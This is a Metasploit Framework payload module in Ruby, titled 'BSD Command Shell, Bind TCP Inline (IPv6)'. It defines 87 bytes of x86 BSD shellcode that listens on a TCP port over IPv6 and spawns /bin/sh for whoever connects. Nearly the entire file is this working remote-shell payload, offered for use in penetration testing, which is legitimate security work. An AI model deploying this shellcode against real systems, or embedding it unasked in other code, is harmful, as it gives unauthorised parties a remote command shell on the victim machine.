##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 87

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD Command Shell, Bind TCP Inline (IPv6)',
      'Description'   => 'Listen for a connection and spawn a command shell over IPv6',
      'Author'        => ['skape', 'vlad902', 'hdm'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 26, 'n' ],
            },
          'Payload' =>
            "\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\x89\xc3\x31" +
            "\xd2\x52\x52\x52\x52\x52\x52\x68\x1c\x1c\xbf\xbf\x89\xe1\x6a\x1c" +
            "\x51\x50\x6a\x68\x58\x50\xcd\x80\xb0\x6a\xcd\x80\x52\x53\x52\xb0" +
            "\x1e\xcd\x80\x97\x6a\x02\x59\x6a\x5a\x58\x51\x57\x51\xcd\x80\x49" +
            "\x79\xf5\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50" +
            "\x54\x53\x53\xb0\x3b\xcd\x80"

        }
      ))
  end
end
